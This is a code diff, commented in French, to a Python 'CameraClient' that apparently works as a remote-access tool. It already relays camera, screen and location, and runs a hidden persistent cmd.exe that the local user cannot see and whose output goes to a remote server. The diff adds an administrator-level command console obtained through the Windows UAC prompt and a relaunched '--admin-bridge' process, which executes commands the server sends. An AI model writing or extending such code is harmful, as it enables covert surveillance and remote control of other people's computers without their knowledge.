@@ -10,19 +10,21 @@ Fonctionnalités (toutes indépendantes) :
   - CMD Commandes : console cmd.exe PERSISTANTE, SANS FENÊTRE, dont
     stdout/stderr sont redirigés vers server_gui (comme les frames caméra).
     L'utilisateur du client ne la voit pas. Seul server_gui y écrit.
+  - CMD Commandes ADMIN : idem, mais via le popup UAC natif de Windows.
+    La console tourne avec les droits admin. Sur Linux : indisponible.
   - Chat : vraie console cmd.exe VISIBLE chez le client, avec capture des
     frappes via hook clavier (Solution B — préfixe invisible). Le [X] est
     neutralisé ; seul server_gui peut fermer la console.
 
-Compatible Windows et Linux (le chat n'est actif que sous Windows).
+Compatible Windows et Linux (le chat et le CMD admin ne sont actifs que
+sous Windows).
 
-CORRECTIFS v8 :
-  - _handle_user_chat : l'écho local "Toi: <msg>" est injecté AVANT
-    l'envoi réseau (retour visuel immédiat). L'injection passe par
-    _send_text (AttachConsole + WriteConsoleInputW, voir console_windows.py),
-    qui ne vole pas le focus et n'est pas capté par le hook.
-  - _send_text n'a plus de paramètre force : l'injection est toujours
-    directe et déterministe.
+CORRECTIFS v9 :
+  - Ajout du CMD Admin (UAC Windows + pont socket localhost).
+  - admin_bridge.py embarqué via PyInstaller --add-data.
+  - Bifurcation --admin-bridge au tout début de main() : indispensable
+    pour que le pont élevé fonctionne aussi dans un .exe PyInstaller
+    (sys.executable = CameraClient.exe, on relance le même exe).
 """
 
 import argparse
@@ -36,6 +38,7 @@ import select
 import shutil
 import socket
 import subprocess
+import sys
 import tempfile
 import time
 import threading
@@ -70,6 +73,18 @@ try:
 except ImportError:
     ChatConsole = None
     _HAS_CHAT_CONSOLE = False
+
+try:
+    from console_admin_windows import RemoteAdminConsole
+    _HAS_ADMIN_CONSOLE = platform.system() == "Windows"
+except ImportError:
+    RemoteAdminConsole = None
+    _HAS_ADMIN_CONSOLE = False
+
+try:
+    import admin_bridge as _admin_bridge
+except ImportError:
+    _admin_bridge = None
 
 
 DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
@@ -630,6 +645,10 @@ class CameraClient:
 
         self._remote_console = RemoteConsole(server_url, device_id)
 
+        self._admin_console: "RemoteAdminConsole | None" = None
+        if _HAS_ADMIN_CONSOLE:
+            self._admin_console = RemoteAdminConsole(server_url, device_id)
+
         self._chat_console: "ChatConsole | None" = None
         if _HAS_CHAT_CONSOLE:
             self._chat_console = ChatConsole(
@@ -660,6 +679,8 @@ class CameraClient:
         if self.screen_on:
             self._stop_screen()
         self._remote_console.stop()
+        if self._admin_console is not None:
+            self._admin_console.stop()
         if self._chat_console is not None:
             try:
                 self._chat_console.close()
@@ -679,6 +700,13 @@ class CameraClient:
                 "location_open": "1" if self.location_open else "0",
                 "chat_window_open": "1" if self._chat_window_is_open() else "0",
                 "cmd_console_open": "1" if self._remote_console.is_running() else "0",
+                "admin_console_open": "1" if (
+                    self._admin_console is not None and self._admin_console.is_running()
+                ) else "0",
+                "admin_refused": "1" if (
+                    self._admin_console is not None and self._admin_console.admin_refused()
+                ) else "0",
+                "platform": platform.system().lower(),
             },
             timeout=REQUEST_TIMEOUT,
         )
@@ -721,9 +749,17 @@ class CameraClient:
         if shell_input and self._remote_console.is_running():
             self._remote_console.write_command(shell_input.get("text", ""))
 
-        # ------------------------------------------------------------------
-        # Chat : CYCLE DE VIE **AVANT** LES MESSAGES.
-        # ------------------------------------------------------------------
+        admin_cmd = commands.get("cmd_admin_console")
+        if self._admin_console is not None:
+            if admin_cmd == "OPEN" and not self._admin_console.is_running():
+                self._admin_console.start()
+            elif admin_cmd == "CLOSE" and self._admin_console.is_running():
+                self._admin_console.stop()
+
+        admin_input = commands.get("shell_admin_input")
+        if admin_input and self._admin_console is not None and self._admin_console.is_running():
+            self._admin_console.write_command(admin_input.get("text", ""))
+
         chat_window_cmd = commands.get("chat_window")
         if self._chat_console is not None:
             try:
@@ -743,11 +779,6 @@ class CameraClient:
                 logger.exception("Erreur lors de l'injection du message chat : %s", exc)
 
     def _handle_user_chat(self, line: str) -> None:
-        """Appelée par le thread dispatcher de ChatConsole (PAS par le hook).
-        On affiche l'écho local immédiatement (retour visuel rapide), puis
-        on envoie au serveur. L'injection passe par _send_text, qui utilise
-        AttachConsole + WriteConsoleInputW : pas de focus volé, pas de
-        capture par le hook."""
         try:
             if self._chat_console is not None and self._chat_console.is_open():
                 safe = (
@@ -1165,6 +1196,14 @@ def parse_args() -> argparse.Namespace:
 
 
 def main() -> None:
+    # Mode « pont élevé » : on a été relancé par console_admin_windows.py
+    # via ShellExecuteW(..., "runas", ...) en tant que CameraClient.exe
+    # --admin-bridge <token> <port>. On bifurque immédiatement vers le
+    # code du wrapper, sans rien initialiser d'autre (pas de config,
+    # pas de logging, pas de boucle client).
+    if _admin_bridge is not None and _admin_bridge.is_bridge_invocation():
+        sys.exit(_admin_bridge.main(sys.argv[1:]))
+
     args = parse_args()
     if args.debug:
         logging.getLogger().setLevel(logging.DEBUG)
